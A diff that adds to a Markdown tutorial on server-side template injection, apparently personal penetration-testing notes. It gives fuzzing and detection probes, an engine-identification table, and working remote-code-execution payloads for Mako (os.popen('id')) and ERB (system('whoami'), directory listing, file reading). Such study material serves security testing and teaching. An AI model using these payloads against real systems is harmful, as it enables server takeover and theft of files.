@@ -44,6 +44,14 @@ As with any vulnerability, the first step towards exploitation is being able to 
 
 Server-side template injection vulnerabilities occur in two distinct contexts, each of which requires its own detection method. Regardless of the results of your fuzzing attempts, it is important to also try the following context-specific approaches. If fuzzing was inconclusive, a vulnerability may still reveal itself using one of these approaches. Even if fuzzing did suggest a template injection vulnerability, you still need to identify its context in order to exploit it. 
 
+    ${{<%[%'"}}%\
+    {{7*7}}
+    ${7*7}
+    <%= 7*7 %>
+    ${{7*7}}
+    #{7*7}
+    *{7*7}
+
 ### Plaintext context
 
 Template languages often permit free content input through HTML tags or the template's native syntax, which is rendered to HTML on the back-end before the HTTP response is sent. For instance, in Freemarker, the line `render('Hello ' + username)` would render as something like `Hello Carlos`.
@@ -120,13 +128,65 @@ Otherwise, manual testing involves trying various language-specific payloads and
 
 ![template-decision-tree](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/b0756980-2d94-4951-965f-229f7c045058)
 
+You should be aware that the same payload can sometimes return a successful response in more than one template language. For example, the payload `{{7*'7'}}` returns `49` in `Twig` and `7777777` in `Jinja2`. Therefore, it is important not to jump to conclusions based on a single successful response.
+
+| `${}`       | `{{}}`       | `<%= %>`        |
+| ----------- | ------------ | --------------- |
+| `${7/0}`    | `{{7/0}}`    | `<%= 7/0 %>`    |
+| `${foobar}` | `{{foobar}}` | `<%= foobar %>` |
+| `${7*7}`    | `{{7*7}}`    | ``              |
+
+### Exploit
+
+After detecting that a potential vulnerability exists and successfully identifying the template engine, you can begin trying to find ways of exploiting it.
+
+# Exploiting server-side template injection vulnerabilities
+
+Once you discover a server-side template injection vulnerability, and identify the template engine being used, successful exploitation typically involves the following process.
+
+## Read
+
+Unless you're already familiar with the template engine, consulting its documentation is typically the initial step. While not the most thrilling use of time, it's crucial not to underestimate the valuable information that documentation can provide.
+
+### Learn the basic template syntax
+
+Mastering fundamental syntax, essential functions, and variable handling is crucial. Even acquiring the skill to embed native code blocks in a template can swiftly lead to an exploit. For instance, with knowledge that the Python-based `Mako` template engine is in use, achieving remote code execution could be as straightforward as:
+
+```python
+<%
+    import os
+    x=os.popen('id').read()
+    %>
+    ${x}
+```
+
+In an unsandboxed environment, achieving remote code execution and using it to read, edit, or delete arbitrary files is similarly as simple in many common template engines.
+
+#### EX1: Basic server-side template injection
+
+![Screenshot 2023-12-31 094728](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/5f7dd076-a44f-4553-bc9a-38754604b8cc)
+![Screenshot 2023-12-31 094759](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/5c051801-4eba-4ae2-8eb6-fc5336879abf)
+![Screenshot 2023-12-31 094809](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/d66a1d9b-be19-4fb6-9091-70fa397cbed6)
+![Screenshot 2023-12-31 094835](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/8650faee-c3ba-4d2c-bffc-7d4c09ebfa7b)
+![Screenshot 2023-12-31 100202](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/9e8999b2-ca4d-4cab-946a-dcd4deb2a700)
+![Screenshot 2023-12-31 100253](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/3ee5cc70-e7ea-42e3-8307-f06a0efdd3ea)
 
 
 
 
 
+###### ERB (Ruby)
 
+- `{{7*7}} = {{7*7}}`
+- `${7*7} = ${7*7}`
+- `<%= 7*7 %> = 49`
+- `<%= foobar %> = Error`
 
+```
+<%= system("whoami") %>
+<%= Dir.entries('/') %>
+<%= File.open('/path/to/file.txt').read %>
+```
 
 # Tools
 
